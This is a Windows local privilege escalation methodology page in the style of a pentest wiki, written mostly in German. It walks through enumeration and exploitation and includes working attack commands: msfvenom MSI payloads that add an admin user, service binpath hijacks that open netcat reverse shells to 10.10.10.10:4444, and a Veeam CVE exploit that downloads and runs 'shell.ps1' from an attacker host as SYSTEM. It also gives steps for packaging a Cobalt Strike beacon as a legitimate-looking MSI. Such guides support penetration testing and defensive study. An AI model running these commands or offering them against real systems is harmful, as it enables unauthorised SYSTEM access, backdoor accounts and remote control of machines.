# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool, um nach Windows local privilege escalation vectors zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Grundlegende Windows-Theorie

### Access Tokens

**Wenn du nicht weißt, was Windows Access Tokens sind, lies bitte die folgende Seite, bevor du weitermachst:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was Integrity Levels in Windows sind, solltest du vor dem Weiterlesen die folgende Seite lesen:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Es gibt verschiedene Mechanismen in Windows, die dich daran hindern können, das System zu enumerieren, Executables auszuführen oder sogar deine Aktivitäten zu entdecken. Du solltest die folgende Seite lesen und all diese Defense-Mechanismen auflisten, bevor du mit der privilege escalation enumeration beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess-Prozesse, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um High IL ohne Aufforderungen zu erreichen, wenn AppInfo secure-path checks umgangen werden. Prüfe den dedizierten UIAccess/Admin Protection Bypass-Workflow hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Propagation der Secure Desktop accessibility-Registry kann missbraucht werden, um einen beliebigen SYSTEM-Registry-Schreibzugriff zu erlangen (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Prüfe, ob die Windows-Version bekannte Sicherheitslücken hat (prüfe auch die angewendeten Patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Versions-Exploits

Diese [site](https://msrc.microsoft.com/update-guide/vulnerability) ist praktisch, um detaillierte Informationen über Microsoft-Sicherheitslücken zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **riesige Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson eingebettet)_

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-Repos mit exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind irgendwelche credential/Juicy-Infos in den env variables gespeichert?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-Verlauf
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkriptdateien

Wie Sie dies aktivieren, erfahren Sie unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Details der PowerShell-Pipeline-Ausführungen werden protokolliert und umfassen ausgeführte Befehle, Kommandoaufrufe und Teile von Skripten. Allerdings werden möglicherweise nicht alle vollständigen Ausführungsdetails und Ausgabeergebnisse erfasst.

Um dies zu aktivieren, befolgen Sie die Anweisungen im Abschnitt "Transcript files" der Dokumentation und wählen Sie **"Module Logging"** anstelle von **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Events aus den PowersShell-Logs anzuzeigen, können Sie ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Ein vollständiges Aktivitäts- und Inhaltsprotokoll der Skriptausführung wird erfasst, sodass jeder Codeblock während seiner Ausführung dokumentiert wird. Dieser Vorgang bewahrt eine umfassende Prüfspur jeder Aktivität, die für Forensik und die Analyse bösartiger Verhaltensweisen wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess geliefert.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Protokollereignisse für den Script Block finden Sie im Windows Event Viewer unter dem Pfad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Interneteinstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Du kannst das System kompromittieren, wenn die Updates nicht über http**S**, sondern über http angefordert werden.

Du beginnst damit zu prüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem du Folgendes in cmd ausführst:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oder Folgendes in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Wenn du eine Antwort wie eine der folgenden erhältst:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Dann ist **es ausnutzbar.** Wenn der zuletzt genannte Registry-Wert `0` ist, wird der WSUS-Eintrag ignoriert.

Um diese Schwachstellen auszunutzen, können Sie Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden — dies sind MiTM-weaponized Exploit-Skripte, um 'gefälschte' Updates in nicht-SSL WSUS-Traffic einzuschleusen.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Im Wesentlichen ist dies der Fehler, den dieser Bug ausnutzt:

> Wenn wir die Möglichkeit haben, den Proxy unseres lokalen Benutzers zu ändern, und Windows Updates den in den Internet Explorer‑Einstellungen konfigurierten Proxy verwendet, haben wir damit die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Traffic abzufangen und Code als ein erhöhter Benutzer auf unserem System auszuführen.
>
> Außerdem verwendet der WSUS‑Service die Einstellungen des aktuellen Benutzers und damit auch dessen Zertifikatsspeicher. Wenn wir ein self‑signed Zertifikat für den WSUS‑Hostnamen erstellen und dieses Zertifikat in den Zertifikatsspeicher des aktuellen Benutzers einfügen, können wir sowohl HTTP‑ als auch HTTPS‑WSUS‑Traffic abfangen. WSUS verwendet keine HSTS‑ähnlichen Mechanismen zur Implementierung einer Trust‑on‑first‑use‑artigen Validierung des Zertifikats. Wenn das vorgelegte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den korrekten Hostnamen hat, wird es vom Service akzeptiert.

Diese Schwachstelle kann mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausgenutzt werden (sobald es verfügbar ist).

## Auto-Updater von Drittanbietern und Agent-IPC (local privesc)

Viele Enterprise‑Agenten stellen eine localhost‑IPC‑Schnittstelle und einen privilegierten Update‑Kanal bereit. Wenn die Enrollment‑Anbindung auf einen Angreifer‑Server umgelenkt werden kann und der Updater einer rogue root CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI liefern, das vom SYSTEM‑Dienst installiert wird. Siehe hier eine verallgemeinerte Technik (basierend auf der Netskope stAgentSvc‑Kette – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stellt einen localhost‑Service auf **TCP/9401** bereit, der von einem Angreifer kontrollierte Nachrichten verarbeitet und die Ausführung beliebiger Befehle als **NT AUTHORITY\SYSTEM** ermöglicht.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Der Dienst führt den Befehl als SYSTEM aus.
## KrbRelayUp

Eine **local privilege escalation**-Schwachstelle besteht in Windows **domain**-Umgebungen unter bestimmten Bedingungen. Dazu gehören Umgebungen, in denen **LDAP signing is not enforced,** Benutzer über self-rights verfügen, die es ihnen erlauben, **Resource-Based Constrained Delegation (RBCD),** zu konfigurieren, und die Möglichkeit für Benutzer, Computer innerhalb der Domain zu erstellen. Es ist wichtig zu beachten, dass diese **requirements** mit den **default settings** erfüllt sind.

Finde das **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für weitere Informationen zum Ablauf des Angriffs siehe [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 Registry-Einträge **aktiviert** (Wert ist **0x1**) sind, können Benutzer mit beliebigen Rechten `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** installieren (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Wenn du eine meterpreter-Sitzung hast, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren

### PowerUP

Verwende den Befehl `Write-UserAddMSI` von power-up, um im aktuellen Verzeichnis eine Windows-MSI-Binärdatei zur Privilegieneskalation zu erstellen. Dieses Skript schreibt einen vorkompilierten MSI-Installer, der zur Hinzufügung eines Benutzers/einer Gruppe auffordert (du benötigst dafür GIU-Zugriff):
```
Write-UserAddMSI
```
Führe einfach die erstellte Binärdatei aus, um Privilegien zu eskalieren.

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
- Right-click the project and select **View > Custom Actions**.
- Right-click **Install** and select **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
- Finally, **build it**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

Um die **Installation** der bösartigen `.msi`-Datei im **Hintergrund** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, können Sie verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Detektoren

### Audit-Einstellungen

Diese Einstellungen legen fest, was **protokolliert** wird, deshalb sollten Sie darauf achten
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — es ist interessant zu wissen, wohin die logs gesendet werden
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist für die **Verwaltung von local Administrator passwords** gedacht und stellt sicher, dass jedes Passwort auf Computern, die einer Domain beigetreten sind, **einzigartig, zufällig und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen über ACLs ausreichende Berechtigungen gewährt wurden, sodass sie local admin passwords einsehen können, wenn sie dazu berechtigt sind.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiviert, werden **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Beginnend mit **Windows 8.1** hat Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) eingeführt, um Versuche von nicht vertrauenswürdigen Prozessen zu **blockieren**, deren **Speicher auszulesen** oder Code zu injizieren und so das System weiter abzusichern.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck ist es, die auf einem Gerät gespeicherten Anmeldeinformationen gegen Bedrohungen wie pass-the-hash attacks zu schützen.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** werden von der **Local Security Authority** (LSA) authentifiziert und von Komponenten des Betriebssystems verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten security package authentifiziert werden, werden für den Benutzer typischerweise domain credentials erstellt.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Überprüfe, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegierte Gruppen

Wenn du **zu einer privilegierten Gruppe gehörst, kannst du möglicherweise Privilegien eskalieren**. Erfahre hier mehr über privilegierte Gruppen und wie du sie missbrauchen kannst, um Privilegien zu eskalieren:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre mehr** darüber, was ein **token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante tokens** und deren Missbrauch zu erfahren:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen
```bash
qwinsta
klist sessions
```
### Home-Verzeichnisse
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Passwortrichtlinie
```bash
net accounts
```
### Inhalt der Zwischenablage abrufen
```bash
powershell -command "Get-Clipboard"
```
## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Zuerst beim Auflisten der Prozesse **auf Passwörter in der Befehlszeile des Prozesses prüfen**.\
Prüft, ob ihr **eine laufende Binary überschreiben** könnt oder ob ihr Schreibrechte für den Binary-Ordner habt, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Prüfe immer, ob möglicherweise [**electron/cef/chromium debuggers** laufen — du könntest sie ausnutzen, um escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Überprüfen der Berechtigungen der Binärdateien der Prozesse**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Berechtigungen der Ordner der Prozess-Binärdateien (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Passwort-Extraktion aus dem Speicher

Du kannst mit procdump von sysinternals einen memory dump eines laufenden Prozesses erstellen. Dienste wie FTP haben die credentials oft als clear text im Speicher — versuche, den Speicher zu dumpen und die credentials auszulesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Als SYSTEM laufende Anwendungen können einem Benutzer erlauben, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows Help and Support" (Windows + F1), suchen Sie nach "command prompt", klicken Sie auf "Click to open Command Prompt"

## Dienste

Service Triggers erlauben Windows, einen Service zu starten, wenn bestimmte Bedingungen eintreten (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Selbst ohne SERVICE_START-Rechte kann man oft privilegierte Services starten, indem man deren Triggers auslöst. Siehe Techniken zur Enumeration und Aktivierung hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Liste der Services abrufen:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Sie können **sc** verwenden, um Informationen über einen Dienst zu erhalten
```bash
sc qc <service_name>
```
Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die für jeden Dienst erforderliche Berechtigungsstufe zu überprüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu prüfen, ob "Authenticated Users" irgendeinen Dienst modifizieren können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn Sie diesen Fehler erhalten (zum Beispiel mit SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Sie können es wie folgt aktivieren
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Beachte, dass der Dienst upnphost von SSDPSRV abhängig ist, damit er funktioniert (für XP SP1)**

**Another workaround** dieses Problems ist das Ausführen von:
```
sc.exe config usosvc start= auto
```
### **Dienst-Binärpfad ändern**

Im Szenario, in dem die Gruppe "Authenticated users" über **SERVICE_ALL_ACCESS** auf einen Dienst verfügt, ist eine Änderung der ausführbaren Binärdatei des Dienstes möglich. Um **sc** zu ändern und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegien können durch verschiedene Berechtigungen eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Service-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen, wodurch Service-Konfigurationen geändert werden können.
- **WRITE_OWNER**: Ermöglicht das Übernehmen des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Vererbt die Fähigkeit, Service-Konfigurationen zu ändern.
- **GENERIC_ALL**: Vererbt ebenfalls die Fähigkeit, Service-Konfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann das _exploit/windows/local/service_permissions_ genutzt werden.

### Schwache Berechtigungen von Service-Binärdateien

**Prüfe, ob du die Binärdatei ändern kannst, die von einem Dienst ausgeführt wird** oder ob du **Schreibberechtigungen für den Ordner** hast, in dem die Binärdatei liegt ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Du kannst jede Binärdatei, die von einem Dienst ausgeführt wird, mit **wmic** (nicht in system32) ermitteln und deine Berechtigungen mit **icacls** überprüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Sie können auch **sc** und **icacls** verwenden:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Berechtigungen zum Ändern der Service-Registry

Du solltest prüfen, ob du irgendeine Service-Registry ändern kannst.\
Du kannst deine **Berechtigungen** für eine Service-**Registry** **prüfen**, indem du:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte geprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** `FullControl`-Berechtigungen besitzen. Falls ja, kann die vom Dienst ausgeführte Binärdatei verändert werden.

Um den Pfad der ausgeführten Binärdatei zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Some Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect that privileged write into **any HKLM path**, giving an arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Wenn Sie diese Berechtigung für ein registry besitzen, bedeutet das, dass **Sie sub registries daraus erstellen können**. Im Fall von Windows services reicht das **aus, um beliebigen Code auszuführen:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jeden Abschnitt vor einem Leerzeichen auszuführen.

Zum Beispiel versucht Windows für den Pfad _C:\Program Files\Some Folder\Service.exe_ Folgendes auszuführen:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste alle unquoted service paths auf, ausgenommen jene, die zu integrierten Windows-Diensten gehören:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
